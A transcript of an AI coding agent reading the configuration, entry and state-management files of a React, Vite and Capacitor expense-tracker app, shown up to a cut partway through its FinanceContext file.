This is a React + Vite + Capacitor financial app (frontend-only, client-side storage). Let me read the core configuration and entry files.

**Tool: read**

**Input:**
```json
{
  "filePath": "E:\\Siva Current Work Backup File\\shyblack\\shyBlackMoneyTracker\\shyblack\\package.json"
}
```

**Output:**
```
<path>E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\package.json</path>
<type>file</type>
<content>
1: {
2:   "name": "finora",
3:   "private": true,
4:   "version": "1.1.0",
5:   "type": "module",
6:   "scripts": {
7:     "dev": "vite",
8:     "build": "vite build",
9:     "lint": "eslint . --ext js,jsx --report-unused-disable-directives",
10:     "preview": "vite preview",
11:     "cap:sync": "npx cap sync",
12:     "cap:open:android": "npx cap open android",
13:     "cap:build:android": "npm run build && npx cap sync",
14:     "test": "node --require ./src/__tests__/setup.cjs ./node_modules/vitest/vitest.mjs run",
15:     "test:watch": "node --require ./src/__tests__/setup.cjs ./node_modules/vitest/vitest.mjs"
16:   },
17:   "dependencies": {
18:     "@aparajita/capacitor-biometric-auth": "^5.2.1",
19:     "@capacitor-community/contacts": "^5.1.1",
20:     "@capacitor/android": "^5.7.8",
21:     "@capacitor/app": "^5.0.0",
22:     "@capacitor/cli": "^5.7.8",
23:     "@capacitor/core": "^5.7.8",
24:     "@capacitor/filesystem": "^5.2.2",
25:     "@capacitor/local-notifications": "^5.0.0",
26:     "@capacitor/share": "^5.0.8",
27:     "i18next": "^26.3.1",
28:     "jspdf": "^4.2.1",
29:     "jspdf-autotable": "^5.0.8",
30:     "lucide-react": "^1.17.0",
31:     "react": "^18.2.0",
32:     "react-dom": "^18.2.0",
33:     "react-i18next": "^17.0.8",
34:     "recharts": "^3.8.1",
35:     "tesseract.js": "^7.0.0"
36:   },
37:   "engines": {
38:     "node": ">=20"
39:   },
40:   "devDependencies": {
41:     "@capacitor/assets": "^3.0.0",
42:     "@types/react": "^18.2.37",
43:     "@types/react-dom": "^18.2.15",
44:     "@vitejs/plugin-react": "^3.1.0",
45:     "autoprefixer": "^10.5.0",
46:     "eslint": "^8.53.0",
47:     "eslint-plugin-react": "^7.33.2",
48:     "eslint-plugin-react-hooks": "^4.6.0",
49:     "eslint-plugin-react-refresh": "^0.4.4",
50:     "postcss": "^8.5.15",
51:     "tailwindcss": "^3.4.19",
52:     "vite": "^4.5.14",
53:     "vitest": "^0.34.6"
54:   }
55: }

(End of file - total 55 lines)
</content>
```

**Tool: read**

**Input:**
```json
{
  "filePath": "E:\\Siva Current Work Backup File\\shyblack\\shyBlackMoneyTracker\\shyblack\\vite.config.js"
}
```

**Output:**
```
<path>E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\vite.config.js</path>
<type>file</type>
<content>
1: import { defineConfig, createLogger } from 'vite'
2: import react from '@vitejs/plugin-react'
3: 
4: const logger = createLogger()
5: const loggerWarn = logger.warn.bind(logger)
6: logger.warn = (msg, options) => {
7:   if (msg.includes('"node:crypto"') || msg.includes("'node:crypto'")) return
8:   loggerWarn(msg, options)
9: }
10: 
11: export default defineConfig({
12:   customLogger: logger,
13:   plugins: [react()],
14:   build: {
15:     target: 'es2020',
16:     rollupOptions: {
17:       onwarn(warning, warn) {
18:         if (warning.code === 'MODULE_LEVEL_DIRECTIVE') return
19:         warn(warning)
20:       },
21:     },
22:   },
23:   test: {
24:     environment: 'node',
25:     include: ['src/__tests__/**/*.test.js'],
26:     pool: 'forks',
27:     poolOptions: {
28:       forks: {
29:         execArgv: ['--require', './src/__tests__/setup.cjs'],
30:       },
31:     },
32:   },
33: })

(End of file - total 33 lines)
</content>
```

**Tool: read**

**Input:**
```json
{
  "filePath": "E:\\Siva Current Work Backup File\\shyblack\\shyBlackMoneyTracker\\shyblack\\capacitor.config.json"
}
```

**Output:**
```
<path>E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\capacitor.config.json</path>
<type>file</type>
<content>
1: {
2:   "appId": "com.shyblack.finance",
3:   "appName": "Expense Tracker - ShyBlack",
4:   "webDir": "dist",
5:   "server": {
6:     "androidScheme": "https"
7:   },
8:   "plugins": {
9:     "LocalNotifications": {
10:       "smallIcon": "ic_stat_finora",
11:       "iconColor": "#39FF14"
12:     },
13:     "Filesystem": {
14:       "android": {
15:         "publicStorage": true
16:       }
17:     },
18:     "Share": {
19:       "android": {
20:         "useFileProvider": true
21:       }
22:     }
23:   }
24: }

(End of file - total 24 lines)
</content>
```

**Tool: read**

**Input:**
```json
{
  "filePath": "E:\\Siva Current Work Backup File\\shyblack\\shyBlackMoneyTracker\\shyblack\\src\\main.jsx"
}
```

**Output:**
```
<path>E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\src\main.jsx</path>
<type>file</type>
<content>
1: import React from 'react'
2: import ReactDOM from 'react-dom/client'
3: import App from './App.jsx'
4: import './index.css'
5: 
6: ReactDOM.createRoot(document.getElementById('root')).render(
7:   <React.StrictMode>
8:     <App />
9:   </React.StrictMode>,
10: )

(End of file - total 10 lines)
</content>
```

---

## Assistant (Build · DeepSeek V4 Flash Free (New) · 3.0s)

_Thinking:_

Let me now read the big central files: App.jsx and FinanceContext.jsx. These are the core. Let me read them in full.

Let me read the core application files.

**Tool: read**

**Input:**
```json
{
  "filePath": "E:\\Siva Current Work Backup File\\shyblack\\shyBlackMoneyTracker\\shyblack\\src\\App.jsx"
}
```

**Output:**
```
<path>E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\src\App.jsx</path>
<type>file</type>
<content>
1: import { useState, useRef, useCallback, lazy, Suspense, useEffect } from 'react'
2: import { FinanceProvider } from './context/FinanceContext'
3: import { ToastProvider } from './components/Toast'
4: import { I18nProvider } from './i18n'
5: import BrandHeader from './components/BrandHeader'
6: import BottomNav from './components/BottomNav'
7: import AndroidBackHandler from './components/AndroidBackHandler'
8: import ErrorBoundary from './components/ErrorBoundary'
9: import PageErrorBoundary from './components/PageErrorBoundary'
10: import { safeStorage, STORAGE_KEYS } from './utils/safeStorage'
11: import Onboarding from './pages/Onboarding'
12: import { refreshReminderSchedule, getReminderPreference, checkAndScheduleMonthlyRecap, checkDebtReminders } from './utils/reminders'
13: import { registerNotificationListeners } from './utils/notifications'
14: import { useFinance } from './hooks/useFinance'
15: import * as privacy from './utils/privacy'
16: import PinLockScreen from './components/PinLockScreen'
17: import QuickActionCenter from './components/QuickActionCenter'
18: import ScrollRestoration from './components/ScrollRestoration'
19: import { App as CapApp } from '@capacitor/app'
20: 
21: const onboardingDone = () => {
22:   const data = safeStorage.get(STORAGE_KEYS.ONBOARDING, {})
23:   return data && data.hasCompletedOnboarding === true
24: }
25: 
26: const Dashboard = lazy(() => import('./pages/Dashboard'))
27: const AddTransaction = lazy(() => import('./pages/AddTransaction'))
28: const History = lazy(() => import('./pages/History'))
29: const Analytics = lazy(() => import('./pages/Analytics'))
30: const Settings = lazy(() => import('./pages/Settings'))
31: const InsightsPage = lazy(() => import('./pages/InsightsPage'))
32: const BudgetsPage = lazy(() => import('./pages/BudgetsPage'))
33: const ReportsPage = lazy(() => import('./pages/ReportsPage'))
34: const DebtsPage = lazy(() => import('./pages/DebtsPage'))
35: const TimelinePage = lazy(() => import('./pages/TimelinePage'))
36: const DiagnosticsPage = lazy(() => import('./pages/DiagnosticsPage'))
37: const GoalsPage = lazy(() => import('./pages/GoalsPage'))
38: const SubscriptionsPage = lazy(() => import('./pages/SubscriptionsPage'))
39: const FinancialCalendar = lazy(() => import('./pages/FinancialCalendarPage'))
40: const EmiCenter = lazy(() => import('./pages/EmiCenterPage'))
41: const NetWorthPage = lazy(() => import('./pages/NetWorthPage'))
42: const FinancialHealthPage = lazy(() => import('./pages/FinancialHealthPage'))
43: const StatementExportPage = lazy(() => import('./pages/StatementExportPage'))
44: const TransferPage = lazy(() => import('./pages/TransferPage'))
45: const CashFlowForecastPage = lazy(() => import('./pages/CashFlowForecastPage'))
46: const FinancialTimelinePage = lazy(() => import('./pages/FinancialTimelinePage'))
47: const AchievementsPage = lazy(() => import('./pages/AchievementsPage'))
48: const SearchPage = lazy(() => import('./pages/SearchPage'))
49: const CategoryDetail = lazy(() => import('./pages/CategoryDetail'))
50: const DocumentVaultPage = lazy(() => import('./pages/DocumentVaultPage'))
51: const StatementCenterPage = lazy(() => import('./pages/StatementCenterPage'))
52: const PersonCenterPage = lazy(() => import('./pages/PersonCenterPage'))
53: const AccountCenterPage = lazy(() => import('./pages/AccountCenterPage'))
54: const DataQualityPage = lazy(() => import('./pages/DataQualityPage'))
55: const ReviewCenterPage = lazy(() => import('./pages/ReviewCenterPage'))
56: const TrendsPage = lazy(() => import('./pages/TrendsPage'))
57: const RecurringTransactionsPage = lazy(() => import('./pages/RecurringTransactionsPage'))
58: const BudgetCenterPage = lazy(() => import('./pages/BudgetCenterPage'))
59: const ReceiptCenterPage = lazy(() => import('./pages/ReceiptCenterPage'))
60: const WealthCenterPage = lazy(() => import('./pages/WealthCenterPage'))
61: const HealthCenterPage = lazy(() => import('./pages/HealthCenterPage'))
62: const RecoveryCenterPage = lazy(() => import('./pages/RecoveryCenterPage'))
63: const ForecastCenterPage = lazy(() => import('./pages/ForecastCenterPage'))
64: const AppInfoPage = lazy(() => import('./pages/AppInfoPage'))
65: const PrivacyCenter = lazy(() => import('./pages/PrivacyCenter'))
66: const BillsPage = lazy(() => import('./pages/BillsPage'))
67: const SIPCalculatorPage = lazy(() => import('./pages/SIPCalculatorPage'))
68: 
69: const pages = {
70:   dashboard: Dashboard,
71:   add: AddTransaction,
72:   history: History,
73:   analytics: Analytics,
74:   settings: Settings,
75:   insights: InsightsPage,
76:   budgets: BudgetsPage,
77:   reports: ReportsPage,
78:   debts: DebtsPage,
79:   timeline: TimelinePage,
80:   diagnostics: DiagnosticsPage,
81:   goals: GoalsPage,
82:   subscriptions: SubscriptionsPage,
83:   calendar: FinancialCalendar,
84:   'emi-center': EmiCenter,
85:   networth: NetWorthPage,
86:   'budget-center': BudgetCenterPage,
87:   'receipt-center': ReceiptCenterPage,
88:   'financial-health': FinancialHealthPage,
89:   'statement-export': StatementExportPage,
90:   transfers: TransferPage,
91:   'cash-flow-forecast': CashFlowForecastPage,
92:   'financial-timeline': FinancialTimelinePage,
93:   achievements: AchievementsPage,
94:   search: SearchPage,
95:   'category-detail': CategoryDetail,
96:   documents: DocumentVaultPage,
97:   statements: StatementCenterPage,
98:   people: PersonCenterPage,
99:   'account-center': AccountCenterPage,
100:   'data-quality': DataQualityPage,
101:   review: ReviewCenterPage,
102:   trends: TrendsPage,
103:   'recurring-transactions': RecurringTransactionsPage,
104:   'wealth-center': WealthCenterPage,
105:   'recovery-center': RecoveryCenterPage,
106:   'health-center': HealthCenterPage,
107:   'forecast-center': ForecastCenterPage,
108:   'app-info': AppInfoPage,
109:   'privacy-center': PrivacyCenter,
110:   bills: BillsPage,
111:   'sip-calculator': SIPCalculatorPage,
112: }
113: 
114: const navPages = ['dashboard', 'add', 'history', 'analytics', 'settings']
115: 
116: function PageLoader() {
117:   return (
118:     <div className="p-4 max-w-lg mx-auto animate-fade-in">
119:       <div className="space-y-4">
120:         <div className="h-8 w-48 bg-matte-200 rounded-lg animate-pulse" />
121:         <div className="h-16 bg-matte-200 rounded-2xl animate-pulse" />
122:         <div className="flex gap-3">
123:           <div className="flex-1 h-24 bg-matte-200 rounded-2xl animate-pulse" />
124:           <div className="flex-1 h-24 bg-matte-200 rounded-2xl animate-pulse" />
125:         </div>
126:         <div className="h-48 bg-matte-200 rounded-2xl animate-pulse" />
127:       </div>
128:     </div>
129:   )
130: }
131: 
132: function ReminderInit() {
133:   const { transactions, debts } = useFinance()
134:   const transactionsRef = useRef(transactions)
135:   const debtsRef = useRef(debts)
136:   useEffect(() => { transactionsRef.current = transactions }, [transactions])
137:   useEffect(() => { debtsRef.current = debts }, [debts])
138: 
139:   useEffect(() => {
140:     const timer = setTimeout(() => {
141:       const txs = transactionsRef.current
142:       const dts = debtsRef.current
143:       if (getReminderPreference()) {
144:         refreshReminderSchedule(txs, dts)
145:       }
146:       checkAndScheduleMonthlyRecap(txs).catch(() => {})
147:       checkDebtReminders(dts).catch(() => {})
148:     }, 2000)
149:     return () => clearTimeout(timer)
150:   }, [])
151: 
152:   return null
153: }
154: 
155: function NotificationTapHandler({ onNavigate }) {
156:   useEffect(() => {
157:     const cleanup = registerNotificationListeners((deepLink, extra) => {
158:       if (deepLink && pages[deepLink]) {
159:         onNavigate(deepLink)
160:       }
161:     })
162:     return cleanup
163:   }, [onNavigate])
164: 
165:   return null
166: }
167: 
168: function LockGate({ isLocked, onUnlock }) {
169:   const { clearAllData } = useFinance()
170: 
171:   if (!isLocked) return null
172: 
173:   return (
174:     <PinLockScreen
175:       onUnlock={onUnlock}
176:       onResetData={() => {
177:         clearAllData()
178:         privacy.clearPin()
179:         onUnlock()
180:       }}
181:     />
182:   )
183: }
184: 
185: function AppContent() {
186:   const [currentPage, setCurrentPage] = useState('dashboard')
187:   const [navParams, setNavParams] = useState(null)
188:   const [animDir, setAnimDir] = useState('forward')
189:   const [history, setHistory] = useState(['dashboard'])
190:   const prevPage = useRef(currentPage)
191: 
192:   const handleNavigate = useCallback((page, params) => {
193:     const prevIdx = navPages.indexOf(prevPage.current)
194:     const nextIdx = navPages.indexOf(page)
195:     const isNavChange = prevIdx >= 0 && nextIdx >= 0
196:     setAnimDir(isNavChange && nextIdx >= prevIdx ? 'forward' : 'backward')
197:     prevPage.current = page
198:     setHistory(prev => prev[prev.length - 1] !== page ? [...prev, page] : prev)
199:     setCurrentPage(page)
200:     setNavParams(params || null)
201:     window.scrollTo({ top: 0, behavior: 'instant' })
202:   }, [])
203: 
204:   const handleGoBack = useCallback(() => {
205:     const newHistory = history.slice(0, -1)
206:     if (newHistory.length < 1) return
207: 
208:     const targetPage = newHistory[newHistory.length - 1]
209:     const pIdx = navPages.indexOf(prevPage.current)
210:     const nIdx = navPages.indexOf(targetPage)
211:     setAnimDir(pIdx >= 0 && nIdx >= 0 && nIdx <= pIdx ? 'backward' : 'forward')
212:     prevPage.current = targetPage
213:     setHistory(newHistory)
214:     setCurrentPage(targetPage)
215:     setNavParams(null)
216:   }, [history])
217: 
218:   const canGoBack = history.length > 1
219:   const pageKey = currentPage + (navParams?.editTransaction?.id || '')
220:   const Page = pages[currentPage]
221:   const showHeader = currentPage === 'dashboard' || navPages.includes(currentPage)
222: 
223:   return (
224:     <div className="min-h-screen flex flex-col">
225:       {showHeader && (
226:         <div className="sticky top-0 z-40 bg-matte/80 backdrop-blur-xl border-b border-glass-border" style={{ paddingTop: 'env(safe-area-inset-top, 0px)' }}>
227:           <div className="max-w-lg mx-auto px-4">
228:             <BrandHeader compact onSecretTap={() => handleNavigate('diagnostics')} />
229:           </div>
230:         </div>
231:       )}
232:       <AndroidBackHandler canGoBack={canGoBack} onGoBack={handleGoBack} />
233:       <ScrollRestoration pageKey={pageKey} />
234:       <Suspense fallback={<PageLoader />}>
235:         <div className={`flex-1 ${animDir === 'forward' ? 'animate-slide-up' : 'animate-fade-in'}`} key={pageKey} style={!showHeader ? { paddingTop: 'env(safe-area-inset-top, 0px)' } : undefined}>
236:           <PageErrorBoundary page={currentPage} onNavigate={handleNavigate}>
237:             <Page onNavigate={handleNavigate} currentPage={currentPage} navParams={navParams} />
238:           </PageErrorBoundary>
239:         </div>
240:       </Suspense>
241:       {navPages.includes(currentPage) && (
242:         <BottomNav active={currentPage} onNavigate={handleNavigate} />
243:       )}
244:       <QuickActionCenter onNavigate={handleNavigate} />
245:       <NotificationTapHandler onNavigate={handleNavigate} />
246:     </div>
247:   )
248: }
249: 
250: export default function App() {
251:   const [isOnboarded, setIsOnboarded] = useState(() => {
252:     return onboardingDone()
253:   })
254:   const [isLocked, setIsLocked] = useState(() => {
255:     privacy.initLockState()
256:     return privacy.isLocked()
257:   })
258: 
259:   const handleOnboardingComplete = useCallback(() => {
260:     setIsOnboarded(true)
261:   }, [])
262: 
263:   const sessionStarted = useRef(false)
264: 
265:   const handleUnlock = useCallback(() => {
266:     sessionStarted.current = true
267:     privacy.unlockSession()
268:     setIsLocked(false)
269:   }, [])
270: 
271:   const isLockedRef = useRef(isLocked)
272:   useEffect(() => { isLockedRef.current = isLocked }, [isLocked])
273:   const pendingResume = useRef(null)
274: 
275:   useEffect(() => {
276: 
277:     const handleResume = () => {
278:       if (!sessionStarted.current) {
279:         // First mount — don't process resume until user has explicitly unlocked
280:         return
281:       }
282:       // Debounce: only process the last resume event within 500ms
283:       if (pendingResume.current) clearTimeout(pendingResume.current)
284:       pendingResume.current = setTimeout(() => {
285:         pendingResume.current = null
286:         const shouldLock = privacy.shouldLockOnResume()
287:         if (shouldLock !== isLockedRef.current) {
288:           setIsLocked(shouldLock)
289:         }
290:       }, 100)
291:     }
292: 
293:     const handleVisibility = () => {
294:       if (document.hidden) {
295:         privacy.onAppBackground()
296:       } else {
297:         handleResume()
298:       }
299:     }
300: 
301:     document.addEventListener('visibilitychange', handleVisibility)
302: 
303:     let capListener = null
304:     CapApp.addListener('appStateChange', ({ isActive }) => {
305:       if (isActive) {
306:         handleResume()
307:       } else {
308:         privacy.onAppBackground()
309:       }
310:     }).then(l => { capListener = l }).catch(() => {})
311: 
312:     return () => {
313:       document.removeEventListener('visibilitychange', handleVisibility)
314:       if (pendingResume.current) clearTimeout(pendingResume.current)
315:       if (capListener) capListener.remove()
316:     }
317:   }, [])
318: 
319:   if (!isOnboarded) {
320:     return (
321:       <ErrorBoundary>
322:         <I18nProvider>
323:           <Onboarding onComplete={handleOnboardingComplete} />
324:         </I18nProvider>
325:       </ErrorBoundary>
326:     )
327:   }
328: 
329:   return (
330:     <ErrorBoundary>
331:       <I18nProvider>
332:         <FinanceProvider>
333:           <ToastProvider>
334:             <LockGate isLocked={isLocked} onUnlock={handleUnlock} />
335:             {!isLocked && (
336:               <>
337:                 <ReminderInit />
338:                 <AppContent />
339:               </>
340:             )}
341:           </ToastProvider>
342:         </FinanceProvider>
343:       </I18nProvider>
344:     </ErrorBoundary>
345:   )
346: }

(End of file - total 346 lines)
</content>
```

---

## Assistant (Build · DeepSeek V4 Flash Free (New) · 3.1s)

_Thinking:_

Now the FinanceContext.jsx - this is the core state management. 59KB. Let me read it in full.

Now the core state management file - FinanceContext.jsx (59KB).

**Tool: read**

**Input:**
```json
{
  "filePath": "E:\\Siva Current Work Backup File\\shyblack\\shyBlackMoneyTracker\\shyblack\\src\\context\\FinanceContext.jsx"
}
```

**Output:**
```
<path>E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\src\context\FinanceContext.jsx</path>
<type>file</type>
<content>
1: import { createContext, useState, useEffect, useCallback, useMemo, useRef } from 'react'
2: import { generateId, extractPeopleFromTransactions, formatCurrency } from '../utils/helpers'
3: import { safeStorage, STORAGE_KEYS } from '../utils/safeStorage'
4: import { buildIndexes } from '../utils/indexer'
5: import { saveSnapshot, findRecoverySnapshot, getRecoveryChainSummary, detectCorruption } from '../utils/snapshotRecovery'
6: import { getBackupHealth, getBackupStats } from '../utils/backupHealth'
7: import { getBudgets, saveBudgets } from '../utils/budgets'
8: import { getRecurringTransactions, saveRecurringTransactions, getDueRecurringTransactions, advanceNextDate, autoExecuteDueRecurring, normalizeRecurringItem, detectDuplicateGeneration } from '../utils/recurring'
9: import { getTags, saveTags } from '../utils/tags'
10: import { getSecuritySettings, saveSecuritySettings } from '../utils/security'
11: import { getDebts, saveDebts, createDebt, applyRepayment, DEBT_TYPES, DEBT_STATUS, addPayment, undoLastPayment, editPayment, deletePayment, settleLedger, getLedgerSummary, getLedgerStatement, getLedgerInsights } from '../utils/debts'
12: import { getGoals, saveGoals, createGoal, updateGoal, deleteGoal, getGoalProjection, migrateLegacySavingsGoal } from '../utils/goals'
13: import { getTemplates, saveTemplates, createTemplate, deleteTemplate, getRecentTemplates } from '../utils/templates'
14: import { getEmis, saveEmis, createEmi, updateEmi, deleteEmi, closeEmi as closeEmiUtil, reopenEmi as reopenEmiUtil, EMI_STATUS, getEmiSummary, getEnhancedEmiSummary, undoPayment, getEmiStatsForDashboard, getEmiInsights, getEmiPaymentHistory } from '../utils/emi'
15: import { getAccounts, saveAccounts, saveNetWorthSnapshot } from '../utils/networth'
16: import {
17:   getDocuments, saveDocuments, createDocument, updateDocument, deleteDocument,
18:   getDocumentStats, getDocumentById, getDocumentFileData,
19: } from '../utils/documents'
20: import { archiveOldTransactions, getArchiveStats } from '../utils/archiveEngine'
21: import { runIntegrityCheck, applyRepairs } from '../utils/dataIntegrity'
22: import {
23:   calculateFinancialScore, detectOverspending, getSavingsRecommendations,
24:   getHabitInsights, getFinancialHealth, checkStreakMilestone,
25:   getMonthlyScoreHistory, getScoreVelocity, getLoggingStreak,
26:   predictMonthEndSpend, getCashflowForecast, getScoreBreakdown,
27:   generateSmartInsights,
28: } from '../utils/insights'
29: import { getCategoryTrends } from '../utils/analytics'
30: import { runMigrations } from '../utils/schema'
31: import { checkAndNotifyBudget } from '../utils/budgetNotifications'
32: import { hapticLight, hapticMedium } from '../utils/haptics'
33: import * as privacy from '../utils/privacy'
34: import {
35:   scheduleEmiNotifications, cancelEmiNotifications,
36:   rescheduleAllEmiNotifications, cancelAllEmiNotifications,
37: } from '../utils/emiNotifications'
38: import { runAllDataChecks } from '../utils/dataQuality'
39: import { generateReviewSummary } from '../utils/reviewCenter'
40: import { getBudgetsV2, saveBudgetsV2, recalculateBudgetSpending, getBudgetDashboardStats, getBudgetHealthV2, getBudgetAlerts, getOverspentCategories, createBudget as createBudgetV2Util, updateBudget as updateBudgetV2Util, deleteBudget as deleteBudgetV2Util, archiveBudget, reactivateBudget } from '../utils/budgetUtils'
41: import { generateSmartRecommendations, generateSpendingInsights, calculateSavingsRate, generateEmiInsights, generateDebtInsights, generateRecurringInsights, calculateFinancialScore as calcFinancialScore } from '../utils/insightsEngine'
42: import { getReceipts, saveReceipts, createReceipt as createReceiptUtil, updateReceipt as updateReceiptUtil, deleteReceipt as deleteReceiptUtil, getReceiptStats } from '../utils/receiptUtils'
43: import { getWealthAssets, saveWealthAssets, createWealthAsset as createWealthAssetUtil, updateWealthAsset as updateWealthAssetUtil, deleteWealthAsset as deleteWealthAssetUtil, calculateNetWorth, getNetWorthHistory, getAssetAllocation, getPortfolioSummary, calculateWealthScore, getWealthDashboardStats, linkAssetToGoal as linkAssetToGoalUtil, unlinkAssetFromGoal as unlinkAssetFromGoalUtil, getAssetsByGoal as getAssetsByGoalUtil } from '../utils/wealthUtils'
44: import { snapshotBeforeClearAll, snapshotBeforeBulkDelete, getBackupDashboardStats, createManualBackup, getAutoSnapshots, deleteAutoSnapshot, restoreAutoSnapshot } from '../utils/backupManager'
45: 
46: // eslint-disable-next-line react-refresh/only-export-components
47: export const FinanceContext = createContext()
48: 
49: function isValidTransaction(t) {
50:   return t && typeof t === 'object' && typeof t.id === 'string' && typeof t.type === 'string' && typeof t.amount === 'number'
51: }
52: 
53: function isValidDebt(d) {
54:   return d && typeof d === 'object' && typeof d.id === 'string' && typeof d.personName === 'string' && (typeof d.amount === 'number' || typeof d.originalAmount === 'number')
55: }
56: 
57: function sanitizeTransactions(raw) {
58:   if (!Array.isArray(raw)) return []
59:   return raw.filter(isValidTransaction)
60: }
61: 
62: function sanitizeDebts(raw) {
63:   if (!Array.isArray(raw)) return []
64:   return raw.filter(isValidDebt).map((d) => {
65:     if (typeof d.originalAmount === 'number') return d
66:     return { ...d, originalAmount: d.amount, currentBalance: d.remainingAmount ?? d.amount, payments: d.payments ?? [], createdDate: d.createdDate ?? d.createdAt ?? Date.now() }
67:   })
68: }
69: 
70: function sanitizeSavingsGoal(raw) {
71:   if (!raw || typeof raw !== 'object') return { target: 0, saved: 0 }
72:   return {
73:     target: typeof raw.target === 'number' ? raw.target : 0,
74:     saved: typeof raw.saved === 'number' ? raw.saved : 0,
75:   }
76: }
77: 
78: function loadInitialState() {
79:   try {
80:     const migrationResult = runMigrations()
81:     let transactions = sanitizeTransactions(safeStorage.get(STORAGE_KEYS.TRANSACTIONS, []))
82:     let recoverySnapshot = null
83: 
84:     if (transactions.length === 0) {
85:       recoverySnapshot = findRecoverySnapshot(transactions)
86:       if (recoverySnapshot) {
87:         transactions = sanitizeTransactions(recoverySnapshot.transactions || [])
88:       }
89:     }
90: 
91:     const integrityResult = runIntegrityCheck({ transactions, debts: sanitizeDebts(safeStorage.get(STORAGE_KEYS.DEBTS, [])), goals: getGoals(), accounts: getAccounts(), transfers: safeStorage.get(STORAGE_KEYS.TRANSFERS, []), emis: getEmis() })
92:     if (integrityResult.hasIssues && integrityResult.summary.totalRepairs > 0) {
93:       const repaired = applyRepairs(integrityResult)
94:       if (repaired.transactions) transactions = sanitizeTransactions(repaired.transactions)
95:       if (repaired.debts) safeStorage.set(STORAGE_KEYS.DEBTS, repaired.debts)
96:       if (repaired.goals) safeStorage.set(STORAGE_KEYS.GOALS, repaired.goals)
97:       if (repaired.accounts) safeStorage.set(STORAGE_KEYS.NET_WORTH_ACCOUNTS, repaired.accounts)
98:       if (repaired.transfers) safeStorage.set(STORAGE_KEYS.TRANSFERS, repaired.transfers)
99:       if (repaired.emis) saveEmis(repaired.emis)
100:     }
101: 
102:     const archiveResult = archiveOldTransactions(transactions)
103:     if (archiveResult.archivedCount > 0) {
104:       safeStorage.set(STORAGE_KEYS.TRANSACTIONS, archiveResult.active)
105:       transactions = sanitizeTransactions(archiveResult.active)
106:     }
107: 
108:     const goals = getGoals()
109:     if (goals.length === 0) migrateLegacySavingsGoal()
110:     const docs = getDocuments()
111:     return {
112:       transactions,
113:       savingsGoal: sanitizeSavingsGoal(safeStorage.get(STORAGE_KEYS.SAVINGS, { target: 0, saved: 0 })),
114:       budgets: getBudgets(),
115:       recurring: getRecurringTransactions(),
116:       tags: getTags(),
117:       security: getSecuritySettings(),
118:       debts: sanitizeDebts(safeStorage.get(STORAGE_KEYS.DEBTS, [])),
119:       goals: getGoals(),
120:       templates: getTemplates(),
121:       emis: getEmis(),
122:       accounts: getAccounts(),
123:       documents: docs,
124:       budgetsV2: getBudgetsV2(),
125:       receipts: getReceipts(),
126:       wealthAssets: getWealthAssets(),
127:       _migrationResult: migrationResult,
128:       _recoverySnapshot: recoverySnapshot,
129:     }
130:   } catch {
131:     const fallbackSnap = findRecoverySnapshot([])
132:     return {
133:       transactions: sanitizeTransactions(fallbackSnap?.transactions || []),
134:       savingsGoal: fallbackSnap?.savingsGoal || { target: 0, saved: 0 },
135:       budgets: {},
136:       budgetsV2: [],
137:       receipts: [],
138:       wealthAssets: [],
139:       recurring: [],
140:       tags: [],
141:       security: { pinEnabled: false, pinCode: '', pinHash: '', biometricEnabled: false, privacyMode: false, hideBalance: false },
142:       debts: [],
143:       emis: [],
144:       accounts: [],
145:       documents: [],
146:       _migrationResult: null,
147:       _recoverySnapshot: fallbackSnap,
148:     }
149:   }
150: }
151: 
152: export function FinanceProvider({ children }) {
153:   const [state, setState] = useState(loadInitialState)
154:   const { transactions, savingsGoal, budgets, budgetsV2, receipts, wealthAssets, recurring, tags, security, debts, goals, templates, emis, accounts, documents, _recoverySnapshot } = state
155:   const [notification, setNotification] = useState(null)
156:   const [recoverySnapshot, setRecoverySnapshot] = useState(_recoverySnapshot)
157:   const [backupVersion, setBackupVersion] = useState(0)
158:   const overspendTimer = useRef(null)
159:   const txPersistTimer = useRef(null)
160: 
161:   // Refs for non-blocking async operations (budget notifications, etc.)
162:   const budgetsRef = useRef(budgets)
163:   const transactionsRef = useRef(transactions)
164:   const savingsGoalRef = useRef(savingsGoal)
165:   const emisRef = useRef(emis)
166:   useEffect(() => { budgetsRef.current = budgets }, [budgets])
167:   useEffect(() => { transactionsRef.current = transactions }, [transactions])
168:   useEffect(() => { savingsGoalRef.current = savingsGoal }, [savingsGoal])
169:   useEffect(() => { emisRef.current = emis }, [emis])
170:   const budgetsV2Ref = useRef(budgetsV2)
171:   useEffect(() => { budgetsV2Ref.current = budgetsV2 }, [budgetsV2])
172: 
173:   // Debounced transaction persistence with rolling snapshot chain
174:   useEffect(() => {
175:     if (txPersistTimer.current) clearTimeout(txPersistTimer.current)
176:     txPersistTimer.current = setTimeout(() => {
177:       try {
178:         safeStorage.set(STORAGE_KEYS.TRANSACTIONS, transactions)
179:         saveSnapshot(transactions, savingsGoalRef.current)
180:       } catch { /* silent */ }
181:     }, 300)
182:     return () => { if (txPersistTimer.current) clearTimeout(txPersistTimer.current) }
183:   }, [transactions])
184: 
185:   // Flush pending transaction persist on unmount to prevent data loss
186:   useEffect(() => {
187:     return () => {
188:       if (txPersistTimer.current) {
189:         clearTimeout(txPersistTimer.current)
190:         txPersistTimer.current = null
191:         try {
192:           safeStorage.set(STORAGE_KEYS.TRANSACTIONS, transactionsRef.current)
193:           saveSnapshot(transactionsRef.current, savingsGoalRef.current)
194:         } catch { /* silent */ }
195:       }
196:     }
197:   }, [])
198: 
199:   // Flush + snapshot + archive on app background to prevent Android lifecycle data loss
200:   useEffect(() => {
201:     const handleVisibility = () => {
202:       if (document.hidden) {
203:         if (txPersistTimer.current) {
204:           clearTimeout(txPersistTimer.current)
205:           txPersistTimer.current = null
206:         }
207:         try {
208:           const archiveResult = archiveOldTransactions(transactionsRef.current)
209:           if (archiveResult.archivedCount > 0) {
210:             safeStorage.set(STORAGE_KEYS.TRANSACTIONS, archiveResult.active)
211:             return
212:           }
213:           safeStorage.set(STORAGE_KEYS.TRANSACTIONS, transactionsRef.current)
214:           saveSnapshot(transactionsRef.current, savingsGoalRef.current)
215:           const accts = safeStorage.get(STORAGE_KEYS.NET_WORTH_ACCOUNTS, [])
216:           const dts = safeStorage.get(STORAGE_KEYS.DEBTS, [])
217:           saveNetWorthSnapshot(transactionsRef.current, dts, accts)
218:         } catch { /* silent */ }
